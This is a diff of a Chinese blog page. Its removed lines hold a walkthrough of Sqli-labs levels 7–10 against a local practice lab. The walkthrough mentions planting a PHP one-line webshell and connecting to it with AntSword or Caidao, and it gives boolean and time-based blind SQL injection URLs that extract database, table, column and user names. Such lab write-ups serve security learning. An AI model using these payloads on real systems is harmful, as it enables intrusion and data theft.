-<li>这里要写入的文件必须是之前没有的，如果我这里还是使用<strong>HSW.php</strong>，那么一句话木马是不会写入的。只有改成不存在的文件名，如<strong>HSW2.php</strong>才行</li>
-<li>我们这里用一句话代替之前3的位置，要加上2个<strong>单引号</strong>把语句括起来</li>
-</ol>
-<p>我们也是可以访问一下这个<strong>HSW2.php</strong>文件，看有没有导入成功。结果看来是有的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-6.png" alt="7-6"></p>
-<p>这是就可以用<strong>蚁剑</strong>或者<strong>菜刀</strong>等等工具去连接</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-7.png" alt="7-7"></p>
-<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less - 8"></a>Less - 8</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-1.png" alt="8-1"></p>
-<p>此时我们发现和之前不同的是，没有报错信息了！怎么办？根据之前的经验，我们配合<strong>or 1=1 –+</strong> 进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-2.png" alt="8-2"></p>
-<p>嗯？返回正常结果了，那我们就可以猜，原文件对<strong>ID</strong>的处理只是简单的<strong>单引号</strong></p>
-<p>查看 <strong>index.php</strong> 文件，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>那么这关也是使用盲注，但是却只能用<strong>布尔注入</strong>和<strong>延时注入</strong></p>
-<p>这关<strong>报错注入无法使用</strong></p>
-<p><strong>布尔注入</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;a&apos; --+</span><br><span class="line"></span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;s&apos; --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-3.png" alt="8-3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-4.png" alt="8-4"></p>
-<p><strong>延时注入</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-5.png" alt="8-5"></p>
-<p><strong>报错注入（无法使用）</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-6.png" alt="8-6"></p>
-<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less - 9"></a>Less - 9</h2><p>题目的标题是<strong>Blind- Time based- Single Quotes</strong>，翻译就是<strong>盲注—基于时间—单引号</strong></p>
-<p>那么我们就根据提示去做题了</p>
-<p>从源代码我们可以看出，不管你做什么，它都只返回<strong>You are in ……..</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-1.png" alt="9-1"></p>
-<p><strong>爆数据库名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-2.png" alt="9-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-3.png" alt="9-3"></p>
-<p>从上面这2张图我们也可以看出，不管输入什么都只返回<strong>You are in ……..</strong>，所以只能根据<strong>响应时间</strong>来判断</p>
-<p>……</p>
-<p>不断尝试之后，我们知道数据库名是<strong>security</strong></p>
-<p><strong>爆security数据库下的表名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1)&gt;&apos;r&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第四个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p>慢慢地爆出security下的表名：emails，referers，uagents，users</p>
-<p><strong>爆users表下的列名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)&gt;&apos;i&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),1,1)&gt;&apos;p&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p>慢慢地爆出users下的列名：id，username，password</p>
-<p><strong>爆users表下的username列的数据</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select username from users limit 0,1),1,1)&gt;&apos;d&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p>爆出第一行的数据是dumb</p>
-<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less - 10"></a>Less - 10</h2><p>题目的标题是<strong>Blind- Time based- Double Quotes</strong>，翻译就是<strong>盲注—基于时间—双引号</strong></p>
-<p>那么这关和第9关的差别就只是<strong>单引号</strong>和<strong>双引号</strong>的问题了</p>
-<p>就不再赘述了，可以自己去尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-10/?id=1&quot; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/10-1.png" alt="10-1"></p>
-<p>至此，1-10关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
@@ -1750,31 +1606,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1782,11 +1618,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF分析</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF分析</a>
               </li>
             
             <div class="clearfix"></div>
